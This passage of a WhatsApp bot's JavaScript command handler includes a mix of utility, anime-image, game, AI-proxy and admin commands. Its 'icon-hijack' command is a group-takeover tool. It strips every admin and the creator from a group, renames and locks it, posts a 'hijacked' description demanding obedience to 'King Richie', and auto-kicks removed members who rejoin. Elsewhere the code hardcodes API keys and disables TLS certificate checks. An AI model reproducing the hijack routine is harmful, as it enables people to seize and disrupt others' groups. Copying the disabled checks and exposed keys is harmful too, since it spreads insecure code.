  } catch (e) {
    // Handling errors and sending error messages
    await rich.sendMessage(m.chat, `can't fetch result from query`);
  }
}
break;
case 'ss':
case 'ssweb':{
if (isban) return reply(`Sorry, only the owner can use this command`)
if (!text) return reply(`Where is the link`)
try {
rich.sendMessage(m.chat, { image: { url: `https://draculazyx-xyzdrac.hf.space/api/Screenshot?url=${encodeURIComponent(text)}` }}, { quoted: m})
			} catch {
	  reply('Yes, there is an error, please report it to the owner so that it can be fixed.')
	}
}
break;
case "profile": 
case "pfp2": {
if (isban) return reply(`Sorry, only the owner can use this command`)
const ppUrl = await rich.profilePictureUrl(chat, 'image')
await rich.sendMessage(
    chat, 
    { 
        image: {
            url: ppUrl
        },
        caption: 'Here is the profile picture'
    }
)
await rich.sendMessage(rich.user.id, { text: ppUrl } )
}
break;

case "deviceid": {
 if (isban) return reply(`Sorry, only the owner can use this command`)
 
  if (!m.quoted) {
    return m.reply('Please quote a message to use this command!');
  }

  try {
    // Get the quoted message
    const quotedMsg = await m.getQuotedMessage();

    if (!quotedMsg) {
      return m.reply('Could not find the quoted message!');
    }

    const messageId = quotedMsg.key.id;
    const messageIdLength = messageId.length;

    m.reply(`Device Information:\nMessage ID: ${messageId}\nMessage ID Length: ${messageIdLength}`);
  } catch (err) {
    m.reply('Error retrieving device information: ' + err.message);
  }
}
break;
    
case 'gpt4': case 'openai': case 'xxai': {
if (isban) return reply(`Sorry, only the owner can use this command`)
  if (!text) return reply(`Ask me anything example ${command} how are you?`)
async function openai(text, logic) { // Membuat fungsi openai untuk dipanggil
    let response = await axios.post("https://chateverywhere.app/api/chat/", {
        "model": {
            "id": "gpt-4",
            "name": "GPT-4",
            "maxLength": 32000,  // Sesuaikan token limit jika diperlukan
            "tokenLimit": 8000,  // Sesuaikan token limit untuk model GPT-4
            "completionTokenLimit": 5000,  // Sesuaikan jika diperlukan
            "deploymentName": "gpt-4"
        },
        "messages": [
            {
                "pluginId": null,
                "content": text, 
                "role": "user"
            }
        ],
        "prompt": logic, 
        "temperature": 0.5
    }, { 
        headers: {
            "Accept": "/*/",
            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36"
        }
    });
    
    let result = response.data;
    return result;
}

let pei = await openai(text, "")
m.reply(pei)
}
break;
case 'icon-hijack': {
  if (isban) return reply(`Sorry, only the owner can use this command`)

  if (!m.isGroup) {
    reply('This command can only be used in groups!');
    return;
  }

  const botNumber = rich.user.id || rich.user.jid.split(':')[0]; // Bot's JID
  const botDeployer = m.sender; // Dynamically use the deployer's JID
  const groupMetadata = await rich.groupMetadata(m.chat);
  const participants = groupMetadata.participants;

  const isAdmins = participants.some(participant => participant.id === m.sender && participant.admin);
  if (!isAdmins) {
    reply('Only group admins can use this command!');
    return;
  }

  const creator = groupMetadata.owner; // Group creator's JID
  const admins = participants.filter(participant => participant.admin === 'admin' || participant.admin === 'superadmin');

  // Avoid removing the bot and deployer's JID
  for (let admin of admins) {
    if (admin.id !== botNumber && admin.id !== botDeployer) { // Exclude bot and deployer
      try {
        await rich.groupParticipantsUpdate(m.chat, [admin.id], 'remove');
        reply(`Removed admin: @${admin.id.split('@')[0]}`);
      } catch (err) {
        console.log(`Failed to remove admin: ${admin.id}`);
        reply(`Error: Could not remove admin @${admin.id.split('@')[0]}.`);
      }
    }
  }

  // Attempt to remove the group creator (if the creator isn't the bot or deployer)
  if (creator && creator !== botDeployer && creator !== botNumber) { // Exclude bot and deployer
    try {
      await rich.groupParticipantsUpdate(m.chat, [creator], 'remove');
      reply(`🔥 Successfully removed the group creator: @${creator.split('@')[0]}`);
    } catch (error) {
      console.error(`Error removing group creator: ${error}`);
      reply('⚠️ Could not remove the creator. Restricting their activity instead.');

      // Restrict messages for the creator
      try {
        await rich.groupSettingUpdate(m.chat, 'announcement');
        reply('🚫 Group switched to admins-only mode to restrict the creator.');
      } catch (restrictError) {
        console.log(`Error restricting creator: ${restrictError}`);
      }
    }
  }

  // Change group name
  try {
    await rich.groupUpdateSubject(m.chat, 'ICON TEAM');
    reply('👑 Group name changed to ICON TEAM!');
  } catch (error) {
    console.error(`Error changing group name: ${error}`);
    reply('⚠️ Could not change group name.');
  }

  // Change group description
    // Change group description
  try {
    await rich.groupUpdateDescription(m.chat, `Welcome to ICON X hijacked gc By icon

This group has been hijacked by ICON MD All members are required to obey the rules and respect the hierarchy.

**Toxic Rules:**

1. Absolute Obedience: Obey richie Solos without question.
2. Credit Where Credit is Due: Give credit to King Richie for his superior coding skills.
3. No Disrespect: No disrespect towards King Richie will be tolerated.
4. No Sharing of Group Content: All content shared within the group is proprietary.
5. Zero Tolerance for Betrayal: Any betrayal will be dealt with swiftly and severely.
6. Mandatory Participation: All members must participate in group activities.
7. No External Links or Invites: No external links or invites allowed.
8. Respect the Hierarchy: Respect the hierarchy of the group.
9. No Spam or Self-Promotion: No spam or self-promotion allowed.
10. King Richie Solos is Always Right: In all matters, King Richie Solos' decision is final.

**Consequences of Breaking the Rules:**

* First offense: Warning and temporary removal
* Second offense: Permanent removal
* Third offense: Public shaming and ridicule

By joining this group, you acknowledge that you have read, understand, and will abide by these rules.`);
    reply('📝 Group description changed!');
  } catch (error) {
    console.error(`Error changing group description: ${error}`);
    reply('⚠️ Could not change group description.');
  }

  // Lock group
  try {
    await rich.groupSettingUpdate(m.chat, 'locked');
    reply('🔒 Group locked!');
  } catch (error) {
    console.error(`Error locking group: ${error}`);
    reply('⚠️ Could not lock group.');
  }

  // Set up a list to track participants who have already been kicked
  let kickedParticipants = [];

  // Watch for rejoining participants (creator or removed admins)
  rich.ev.on('group-participants.update', async (update) => {
    const rejoiningParticipants = update.participants;

    for (let participant of rejoiningParticipants) {
      // Ensure we only kick the creator or removed admins once
      if ((participant === creator || admins.some(admin => admin.id === participant)) && !kickedParticipants.includes(participant)) {
        try {
          await rich.groupParticipantsUpdate(m.chat, [participant], 'remove');
          reply(`P̞̝̾ͤ͜͡💥͇͇̗͙̘͈̜̝💥͔̬͢͡U͡💥̜̞̬͈̭̪͎̠͖̥͕̫ͤ̄͜💥̷͓͠XXXXX𝐗⃟⃟⃟💥 Auto-kicked rejoining participant: @${participant.split('@')[0]}`);
          kickedParticipants.push(participant);
        } catch (error) {
          console.error(`Error auto-kicking participant: ${error}`);
        }
      }
    }
  });
}
break;

case "translate":
case "tr":{
 if (isban) return reply(`Sorry, only the owner can use this command`)
let lang, text
if (args.length >= 2) {
lang = args[0] ? args[0] : 'id', text = args.slice(1).join(' ')
} else if (m?.quoted && m?.quoted.text) {
lang = args[0] ? args[0] : 'id', text = m?.quoted.text
} else throw `Ex: ${usedPrefix + command} id hello i am robot`
const translate = require('@vitalets/google-translate-api')
let res = await translate(text, { to: lang, autoCorrect: true }).catch(_ => null)
if (!res) return reply(`Error : Language "${lang}" Not Supported`)
reply(`*Detected Language:* ${res.from?.language.iso}\n *To Language:* ${lang}\n\n *Translation:* ${res.text}`.trim())
}
break;
case "device":
case "getdevice": {
	 if (isban) return reply(`Sorry, only the owner can use this command`)
  if (!m.quoted) {
    return m.reply('Please quote a message to use this command!');
  }

  try {
    // Get the quoted message
    const quotedMsg = await m.getQuotedMessage();

    if (!quotedMsg) {
      return m.reply('Could not detect, please try with newly sent message!');
    }

    const messageId = quotedMsg.key.id;

    // Determine the device using the getDevice function from Baileys
    const device = getDevice(messageId) || 'Unknown';

    m.reply(`The message is sent from ${device} device.`);
  } catch (err) {
    m.reply('Error determining device: ' + err.message);
  }
}
break;
case "autoreact": {
 if (isban) return reply(`Sorry, only the owner can use this command`)                          
 if (!isCreator) return m.reply("Owner only.");
    // Parse command for 'on' or 'off'
    const args = text.trim().split(' ')[0];
    if (!args || !["on", "off"].includes(args)) {
        return reply('Example: autoreact on/off');
    }

    if (!global.autoReact) global.autoReact = {};

    // Set auto-react status based on command
    if (args === "on") {
        global.autoReact[m.chat] = true;
        return reply('auto react command launched successfully enjoy');
    } else if (args === "off") {
        global.autoReact[m.chat] = false;
        return reply('```auto react command off```');
    }
}
break;
case 'broadcastimage': case 'bcimage': case 'broadcastvideo': case 'broadcastvid':
if (isban) return reply(`Sorry, only the owner can use this command`)
if (!isCreator) return m.reply("Owner only.");
        if (!q) return reply(`reply to an image with your desired text `)
        let getGroups = await rich.groupFetchAllParticipating()
        let groups = Object.entries(getGroups).slice(0).map(entry => entry[1])
        let xeoncast = groups.map(v => v.id)
        reply(` Posting in ${xeoncast.length} Group chat, deep ${xeoncast.length * 1,5} second`)
        for (let i of xeoncast) {
let txt = `${ownername}'s Broadcast\n\nMessage : ${q}`
if(/image/.test(mime)) {
let media = await quoted.download()
await rich.sendMessage(i, { image:media,  caption: txt,mentions:participants.map(a => a.id) })
}
if(/video/.test(mime)){
let media = await quoted.download()
await rich.sendMessage(i, { video:media,  caption: txt, mentions:participants.map(a => a.id) })
}
            }
        reply(`The results are broadcast in the group ${xeoncast.length}`)      
        break;
case 'imbd':
if (isban) return reply(`Sorry, only the owner can use this command`)
if (!text) return reply(`_Name a Series or movie`)
            let fids = await axios.get(`http://www.omdbapi.com/?apikey=742b2d09&t=${text}&plot=full`)
            let imdbt = ""
            console.log(fids.data)
            imdbt += "⚍⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚍\n" + " ``` IMDB SEARCH```\n" + "⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎\n"
            imdbt += "🎬Title      : " + fids.data.Title + "\n"
            imdbt += "📅Year       : " + fids.data.Year + "\n"
            imdbt += "⭐Rated      : " + fids.data.Rated + "\n"
            imdbt += "📆Released   : " + fids.data.Released + "\n"
            imdbt += "⏳Runtime    : " + fids.data.Runtime + "\n"
            imdbt += "🌀Genre      : " + fids.data.Genre + "\n"
            imdbt += "👨🏻‍💻Director   : " + fids.data.Director + "\n"
            imdbt += "✍Writer     : " + fids.data.Writer + "\n"
            imdbt += "👨Actors     : " + fids.data.Actors + "\n"
            imdbt += "📃Plot       : " + fids.data.Plot + "\n"
            imdbt += "🌐Language   : " + fids.data.Language + "\n"
            imdbt += "🌍Country    : " + fids.data.Country + "\n"
            imdbt += "🎖️Awards     : " + fids.data.Awards + "\n"
            imdbt += "📦BoxOffice  : " + fids.data.BoxOffice + "\n"
            imdbt += "🏙️Production : " + fids.data.Production + "\n"
            imdbt += "🌟imdbRating : " + fids.data.imdbRating + "\n"
            imdbt += "✅imdbVotes  : " + fids.data.imdbVotes + ""
           rich.sendMessage(m.chat, {
image: {
url: fids.data.Poster,
},
caption: imdbt,
            }, {
quoted: m,
            })
            break;
            case 'tiktoksearch':
case 'ttsearch': {
if (isban) return reply(`Sorry, only the owner can use this command`)
    const dann = require('d-scrape')
if (!text) return reply(` cindigo `)
await rich.sendMessage(m.chat, {react: {text: '✅', key: m.key}})
try {
let anu = await dann.search.tiktoks(text)
rich.sendMessage(m.chat, { video: { url: anu.no_watermark }, mimetype: 'video/mp4', caption: anu.title }, { quoted : m })
} catch (error) {
m.reply('Error : cannot fetch from query')
}
}
break;
              case 'animeavatar': {
            if (isban) return reply(`Sorry, only the owner can use this command`)
 waifudd = await axios.get(`https://nekos.life/api/v2/img/avatar`)     
            await rich.sendMessage(m.chat, {image: {url:waifudd.data.url}, caption: m.success},{ quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break;
//game
            case 'ttc':
            case 'ttt':
            case 'tictactoe': {
           if (isban) return reply(`Sorry, only the owner can use this command`)
                let TicTacToe = require("./lib/tictactoe")
                this.game = this.game ? this.game : {}
                if (Object.values(this.game).find(room => room.id.startsWith('tictactoe') && [room.game.playerX, room.game.playerO].includes(m.sender))) return reply('You are still in the game')
                let room = Object.values(this.game).find(room => room.state === 'WAITING' && (text ? room.name === text : true))
                if (room) {
                    reply('Partner not found!')
                    room.o = m.chat
                    room.game.playerO = m.sender
                    room.state = 'PLAYING'
                    let arr = room.game.render().map(v => {
                        return {
                            X: '❌',
                            O: '⭕',
                            1: '1️⃣',
                            2: '2️⃣',
                            3: '3️⃣',
                            4: '4️⃣',
                            5: '5️⃣',
                            6: '6️⃣',
                            7: '7️⃣',
                            8: '8️⃣',
                            9: '9️⃣',
                        } [v]
                    })
                    let str = `Room ID: ${room.id}

${arr.slice(0, 3).join('')}
${arr.slice(3, 6).join('')}
${arr.slice(6).join('')}

Wait @${room.game.currentTurn.split('@')[0]}

Type *surrender* to give up and admit defeat`
                    if (room.x !== room.o) await rich.sendText(room.x, str, m, {
                        mentions: parseMention(str)
                    })
                    await rich.sendText(room.o, str, m, {
                        mentions: parseMention(str)
                    })
                } else {
                    room = {
                        id: 'tictactoe-' + (+new Date),
                        x: m.chat,
                        o: '',
                        game: new TicTacToe(m.sender, 'o'),
                        state: 'WAITING'
                    }
                    if (text) room.name = text
                    reply('Waiting for partner type .tictactoe to join' + (text ? ` type the command below ${prefix}${command} ${text}` : ''))
                    this.game[room.id] = room
                }
            }
            break;
            case 'delttc':
            case 'delttt': {
           if (isban) return reply(`Sorry, only the owner can use this command`)
                this.game = this.game ? this.game : {}
                try {
                    if (this.game) {
                        delete this.game
                        rich.sendText(m.chat, `Successfully delete TicTacToe session`, m)
                    } else if (!this.game) {
                        reply(`Session TicTacToe🎮 Session is missing`)
                    } else reply('?')
                } catch (e) {
                    reply('error')
                }
            }
            break;
            case 'clear': {
if (isban) return reply(`Sorry, only the owner can use this command`)
if (!isCreator) return m.reply("Owner only.");
rich.chatModify({ delete: true, lastMessages: [{ key: m.key, messageTimestamp: m.messageTimestamp }] }, m.chat)
}
break;
case 'get2':{
if (isban) return reply(`Sorry, only the owner can use this command`)
        if (!/^https?:\/\//.test(text)) return reply(`ex : ${prefix + command} https://`);
        const ajg = await fetch(text);
          await reaction(m.chat, "✅")
        if (ajg.headers.get("content-length") > 100 * 1024 * 1024) {
            throw `Content-Length: ${ajg.headers.get("content-length")}`;
        }

        const contentType = ajg.headers.get("content-type");
        if (contentType.startsWith("image/")) {
            return rich.sendMessage(
                m.chat,
                { image: { url: text } },
                { quoted: glxNull }
            );
        }
        if (contentType.startsWith("video/")) {
            return conn.sendMessage(
                m.chat,
                { video: { url: text } },
                { quoted: glxNull  }
            );
        }
        if (contentType.startsWith("audio/")) {
            return rich.sendMessage(
                m.chat,
                { audio: { url: text },
                mimetype: 'audio/mpeg', 
                ptt: true
                },
                { quoted: glxNull }
            );
        }
        
        let alak = await ajg.buffer();
        try {
            alak = util.format(JSON.parse(alak + ""));
        } catch (e) {
            alak = alak + "";
        } finally {
            return reply(alak.slice(0, 65536));
        }
      }
      break;

case "play":{
                if (!text) return reply(`*Example*: ${prefix + command} highlights`)
                await reply("Wait,Icon-MD IS PROCESSING AUDIO")
                let mbut = await fetchJson(`https://ochinpo-helper.hf.space/yt?query=${text}`)
                let ahh = mbut.result
                let crot = ahh.download.audio

                rich.sendMessage(m.chat, {
                    audio: { url: crot },
                    mimetype: "audio/mpeg", 
                    ptt: true
                }, { quoted: m })
            }
            break;
case 'animesearch': {
if (isban) return reply(`Sorry, only the owner can use this command`)
if (!text) return reply(`Which anime are you lookin for?`)
const malScraper = require('mal-scraper')
        const anime = await malScraper.getInfoFromName(text).catch(() => null)
        if (!anime) return reply(`Could not find`)
let animetxt = `
🎀 *Title: ${anime.title}*
🎋 *Type: ${anime.type}*
🎐 *Premiered on: ${anime.premiered}*
💠 *Total Episodes: ${anime.episodes}*
📈 *Status: ${anime.status}*
💮 *Genres: ${anime.genres}
📍 *Studio: ${anime.studios}*
🌟 *Score: ${anime.score}*
💎 *Rating: ${anime.rating}*
🏅 *Rank: ${anime.ranked}*
💫 *Popularity: ${anime.popularity}*
♦️ *Trailer: ${anime.trailer}*
🌐 *URL: ${anime.url}*
❄ *Description:* ${anime.synopsis}*`
                await rich.sendMessage(m.chat,{image:{url:anime.picture}, caption:animetxt},{quoted:m})
                }
                break;
                
            case 'animehighfive':{
            if (isban) return reply(`Sorry, only the owner can use this command`)
 waifudd = await axios.get(`https://waifu.pics/api/sfw/highfive`)       
            await rich.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: m.success}, { quoted:m }).catch(err => {
return('Error!')
})
}
break;
case 'animecringe':{
if (isban) return reply(`Sorry, only the owner can use this command`)
 waifudd = await axios.get(`https://waifu.pics/api/sfw/cringe`)       
            await rich.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: m.success}, { quoted:m }).catch(err => {
return('Error!')
})
}
break;
case 'animedance':{
if (isban) return reply(`Sorry, only the owner can use this command`)
reply(mess.wait)
 waifudd = await axios.get(`https://waifu.pics/api/sfw/dance`)       
            await rich.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: m.success}, { quoted:m }).catch(err => {
return('Error!')
})
}
break;
case 'animehappy':{
if (isban) return reply(`Sorry, only the owner can use this command`)
 waifudd = await axios.get(`https://waifu.pics/api/sfw/happy`)       
            await rich.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: m.success}, { quoted:m }).catch(err => {
return('Error!')
})
}
break;
case 'animeglomp':{
if (isban) return reply(`Sorry, only the owner can use this command`)
 waifudd = await axios.get(`https://waifu.pics/api/sfw/glomp`)       
            await rich.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: m.success}, { quoted:m }).catch(err => {
return('Error!')
})
}
break;
case 'animesmug':{
if (isban) return reply(`Sorry, only the owner can use this command`)
reply(mess.wait)
 waifudd = await axios.get(`https://waifu.pics/api/sfw/smug`)       
            await rich.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: m.success}, { quoted:m }).catch(err => {
return('Error!')
})
}
break;
case 'animeblush':{
if (isban) return reply(`Sorry, only the owner can use this command`)
reply(mess.wait)
 waifudd = await axios.get(`https://waifu.pics/api/sfw/blush`)       
            await rich.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: m.success}, { quoted:m }).catch(err => {
return('Error!')
})
}
break;
case 'listonline': {
if (isban) return reply(`Sorry, only the owner can use this command`)
if (!isCreator) return m.reply("Owner only.");
        if (!m.isGroup) return reply(mess.grouponly);
        rich.sendMessage(from, { react: { text: "✅", key: m.key } })
        let id = args && /\d+\-\d+@g.us/.test(args[0]) ? args[0] : m.chat
        let online = [...Object.keys(store.presences[id]), botNumber]
        let liston = 1
        rich.sendText(m.chat, ' 「Members Online」\n\n' + online.map(v => `${liston++} . @` + v.replace(/@.+/, '')).join`\n`, m, { mentions: online })
      }
      break;
case 'animewave':{
if (isban) return reply(`Sorry, only the owner can use this command`)
 waifudd = await axios.get(`https://waifu.pics/api/sfw/wave`)       
            await rich.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: m.success}, { quoted:m }).catch(err => {
return('Error!')
})
}
break;
case 'animesmile':{
if (isban) return reply(`Sorry, only the owner can use this command`)
 waifudd = await axios.get(`https://waifu.pics/api/sfw/smile`)       
            await rich.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: m.success}, { quoted:m }).catch(err => {
return('Error!')
})
}
break;
case 'animepoke':{
if (isban) return reply(`Sorry, only the owner can use this command`)
 waifudd = await axios.get(`https://waifu.pics/api/sfw/poke`)       
            await rich.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: m.success}, { quoted:m }).catch(err => {
return('Error!')
})
}
break;
case 'animewink':{
if (isban) return reply(`Sorry, only the owner can use this command`)
 waifudd = await axios.get(`https://waifu.pics/api/sfw/wink`)       
            await rich.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: m.success}, { quoted:m }).catch(err => {
return('Error!')
})
}
break;
case 'animebonk':{
if (isban) return reply(`Sorry, only the owner can use this command`)
 waifudd = await axios.get(`https://waifu.pics/api/sfw/bonk`)       
            await rich.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: m.success}, { quoted:m }).catch(err => {
return('Error!')
})
}
break;
case 'animebully':{
if (isban) return reply(`Sorry, only the owner can use this command`)
 waifudd = await axios.get(`https://waifu.pics/api/sfw/bully`)       
            await rich.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: m.success}, { quoted:m }).catch(err => {
return('Error!')
})
}
break;
case 'animeyeet':{
if (isban) return reply(`Sorry, only the owner can use this command`)
 waifudd = await axios.get(`https://waifu.pics/api/sfw/yeet`)       
            await rich.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: m.success}, { quoted:m }).catch(err => {
return('Error!')
})
}
break;
case 'animebite':{
if (isban) return reply(`Sorry, only the owner can use this command`)
 waifudd = await axios.get(`https://waifu.pics/api/sfw/bite`)       
            await rich.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: m.success}, { quoted:m }).catch(err => {
return('Error!')
})
}
break;
case 'animelick':{
if (isban) return reply(`Sorry, only the owner can use this command`)
 waifudd = await axios.get(`https://waifu.pics/api/sfw/lick`)       
            await rich.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: m.success}, { quoted:m }).catch(err => {
return('Error!')
})
}
break;
case 'animekill':{
if (isban) return reply(`Sorry, only the owner can use this command`)
 waifudd = await axios.get(`https://waifu.pics/api/sfw/kill`)       
            await rich.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: m.success}, { quoted:m }).catch(err => {
return('Error!')
})
}
break;
case 'tovn': {
  if (isban) return reply(`Sorry, only the owner can use this command`)
  if (!/video|audio/.test(mime)) return reply('Media type not supported. Please reply to a video or voice note.');

  try {
    let media = await quoted.download();
    await rich.sendMessage(m.chat, {
      audio: media,
      mimetype: 'audio/mpeg',
      ptt: false
    }, { quoted: m });
  } catch (e) {
    reply('Failed to convert media to audio.');
  }
}
break;
case 'qc': {
  if (!text) return m.reply('use format: qc your quote');

  const name = m.pushName || 'User';
  const quote = text.trim();

  let profilePic;
  try {
    profilePic = await rich.profilePictureUrl(m.sender, 'image');
  } catch {
    profilePic = 'https://telegra.ph/file/6880771c1f1b5954d7203.jpg'; // fallback
  }

  const url = `https://www.laurine.site/api/generator/qc?text=${encodeURIComponent(quote)}&name=${encodeURIComponent(name)}&photo=${encodeURIComponent(profilePic)}`;

  try {
    await rich.sendImageAsSticker(m.chat, url, m, {
      packname: global.packname,
      author: global.author
    });
  } catch (err) {
    console.error('Quote card sticker generation error:', err);
    m.reply('Oops! Failed to create your quote sticker.');
  }
}
break;
case 'ai': {
  if (!text) return m.reply('Example: .ai what is the capital of France?');

  await rich.sendPresenceUpdate('composing', m.chat);

  try {
    const { data } = await axios.post("https://chateverywhere.app/api/chat/", {
      model: {
        id: "gpt-4",
        name: "GPT-4",
        maxLength: 32000,
        tokenLimit: 8000,
        completionTokenLimit: 5000,
        deploymentName: "gpt-4"
      },
      messages: [{ pluginId: null, content: text, role: "user" }],
      prompt: text,
      temperature: 0.5
    }, {
      headers: {
        "Accept": "*/*",
        "User-Agent": "WhatsApp Bot"
      }
    });

    await rich.sendMessage(m.chat, {
      text: `╭─❍ AI Assistant\n│\n│ Q: ${text}\n│\n│ A:\n│ ${data}\n│\n╰─✅Need anything else?`
    }, { quoted: m });

  } catch (e) {
    await m.reply(`AI encountered a problem: ${e.message}`);
  }
}
break;

case 'img': 
case 'image':
case 'gptimage': {
    if (!text) return m.reply('Example: .gptimage long haired anime girl with blue eyes')
 
    m.reply('Wait...')
 
    const gpt1image = async (yourImagination) => {
        const headers = {
            "content-type": "application/json",
            "referer": "https://gpt1image.exomlapi.com/",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36"
        }
 
        const body = JSON.stringify({
            "prompt": yourImagination,
            "n": 1,
            "size": "1024x1024",
            "is_enhance": true,
            "response_format": "url"
        })
 
        const response = await fetch("https://gpt1image.exomlapi.com/v1/images/generations", {
            headers,
            body,
            method: "POST"
        })
 
        if (!response.ok) throw Error(`fetch gagal di alamat ${response.url} ${response.status} ${response.statusText}.`)
 
        const json = await response.json()
        const url = json?.data?.[0]?.url
 
        if (!url) throw Error("fetch berhasil tapi url result nya kosong" + (json.error ? ", error dari server : " + json.error : "."))
 
        return url
    }
 
    try {
        const imageUrl = await gpt1image(text)
        await rich.sendMessage(m.chat, {
            image: { url: imageUrl }
        }, { quoted: m })
    } catch (error) {
        m.reply(`${error.message}`)
    }
}
break;

case 'quote': {
    try {
        const res = await fetch('https://zenquotes.io/api/random');
        const json = await res.json();
        const quote = json[0].q;
        const author = json[0].a;

        // Optional: Generate image using API
        const quoteImg = `https://dummyimage.com/600x400/000/fff.png&text=${encodeURIComponent(`"${quote}"\n\n- ${author}`)}`;

        rich.sendMessage(m.chat, {
            image: { url: quoteImg },
            caption: `_"${quote}"_\n\n— *${author}*`
        }, { quoted: m });

    } catch (err) {
        m.reply('Failed to fetch quote.');
    }
}
break;

case 'joke': {
  let res = await fetch('https://v2.jokeapi.dev/joke/Any?type=single'); 
  let data = await res.json();

  await rich.sendMessage(m.chat, {
    image: { url: 'https://files.catbox.moe/gr1jfa.jpg' },
    caption: `*😂 Here's a joke for you:*\n\n${data.joke}`
  }, { quoted: m });
}
break;
case 'truth': {
  let res = await fetch('https://api.truthordarebot.xyz/v1/truth');
  let data = await res.json();

  await rich.sendMessage(m.chat, {
    image: { url: 'https://files.catbox.moe/lhviht.jpg' },
    caption: `*🔥 Truth Time!*\n\n❖ ${data.question}`
  }, { quoted: m });
}
break;
case 'dare': {
  let res = await fetch('https://api.truthordarebot.xyz/v1/dare');
  let data = await res.json();

  await rich.sendMessage(m.chat, {
    image: { url: 'https://files.catbox.moe/t01fmm.jpg' },
    caption: `*🔥 Dare Challenge!*\n\n❖ ${data.question}`
  }, { quoted: m });
}
break;
 case 'animedl': {
    if (isban) return reply(`Sorry, only the owner can use this command`)
    if (!q.includes("|")) {
        return reply("Example: animedl Solo Leveling | 1");
    }

    try {
        const [animeName, episode] = q.split("|").map(x => x.trim()); 

        const apiUrl = `https://draculazxy-xyzdrac.hf.space/api/Animedl?q=${encodeURIComponent(animeName)}&ep=${encodeURIComponent(episode)}`;

        process.env.NODE_TLS_REJECT_UNAUTHORIZED = "0"; 

        const { data } = await axios.get(apiUrl, {
            httpsAgent: new (require('https').Agent)({ rejectUnauthorized: false })
        });

        if (data.STATUS !== 200 || !data.download_link) {
            return reply("⚠️ *Failed to retrieve the anime episode!*\n\nPlease check the anime name and episode number.");
        }

        const { anime, episode: epNumber, download_link } = data;

        let message = `
🎥 *Anime Found!*

📺 *Name:* ${anime}
📌 *Episode:* ${epNumber}

📥 *Downloading... Please wait!*
        `.trim();

        await reply(message);

    
        await rich.sendMessage(m.chat, {
            document: { url: download_link },
            mimetype: "video/mp4",
            fileName: `${anime} - Episode ${epNumber}.mp4`
        }, { quoted: m });

    } catch (error) {
        console.error("Anime Downloader Error:", error.message);
        reply("Error!, Please try again later.");
    }
}
break;
 case 'weather':{
  if (isban) return reply(`Sorry, only the owner can use this command`)
if (!text) return reply('location?')
            let wdata = await axios.get(
                `https://api.openweathermap.org/data/2.5/weather?q=${text}&units=metric&appid=060a6bcfa19809c2cd4d97a212b19273&language=en`
            );
            let textw = ""
            textw += `*🗺️Weather of  ${text}*\n\n`
            textw += `*Weather:-* ${wdata.data.weather[0].main}\n`
            textw += `*Description:-* ${wdata.data.weather[0].description}\n`
            textw += `*Avg Temp:-* ${wdata.data.main.temp}\n`
            textw += `*Feels Like:-* ${wdata.data.main.feels_like}\n`
            textw += `*Pressure:-* ${wdata.data.main.pressure}\n`
            textw += `*Humidity:-* ${wdata.data.main.humidity}\n`
            textw += `*Humidity:-* ${wdata.data.wind.speed}\n`
            textw += `*Latitude:-* ${wdata.data.coord.lat}\n`
            textw += `*Longitude:-* ${wdata.data.coord.lon}\n`
            textw += `*Country:-* ${wdata.data.sys.country}\n`

           rich.sendMessage(
                m.chat, {
                    text: textw,
                }, {
                    quoted: m,
                }
           )
           }
           break;
           case 'cry': case 'kill': case 'hug': case 'pat': case 'lick': 
case 'kiss': case 'bite': case 'yeet': case 'bully': case 'bonk':
case 'wink': case 'poke': case 'nom': case 'slap': case 'smile': 
case 'wave': case 'awoo': case 'blush': case 'smug': case 'glomp': 
case 'happy': case 'dance': case 'cringe': case 'cuddle': case 'highfive': 
case 'shinobu': case 'handhold': {
 if (isban) return reply(`Sorry, only the owner can use this command`)
axios.get(`https://api.waifu.pics/sfw/${command}`)
.then(({data}) => {
rich.sendImageAsSticker(from, data.url, m, { packname: global.packname, author: global.author })
})
}
break;
case 'unblock': case 'unblocked': {
 if (isban) return reply(`Sorry, only the owner can use this command`)
	 if (!isCreator) return m.reply("Owner only.");
		let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
		await rich.updateBlockStatus(users, 'unblock')
		await reply(`Done`)
	}
	break;
	case 'block': {
                    if (isban) return reply(mess.only.owner);
                    let users;

                    if (m.isGroup) {
                        if (m.quoted && m.quoted.sender) {
                            users = m.quoted.sender;
                        } else if (text) {
                            users = text.replace(/[^0-9]/g, '') + '@s.whatsapp.net';
                        }
                    } else {
                        users = m.chat;
                    }

                    if (users && users.replace(/[^0-9]/g, '').length >= 7) {
                        await rich.updateBlockStatus(users, "block");
                        reply(mess.success);
                    } else {
                        reply("Please reply to a message or provide a valid number to block.");
                    }
                    break;
                }
case 'creategc': case 'creategroup': {
 if (isban) return reply(`Sorry, only the owner can use this command`)
 if (!isCreator) return m.reply("Owner only.");
if (!args.join(" ")) return reply(`Use ${prefix+command} groupname`)
try {
let cret = await rich.groupCreate(args.join(" "), [])
let response = await rich.groupInviteCode(cret.id)
teks = ` 「 Create Group 」
▸ Name : ${cret.subject}
▸ Owner : @${cret.owner.split("@")[0]}
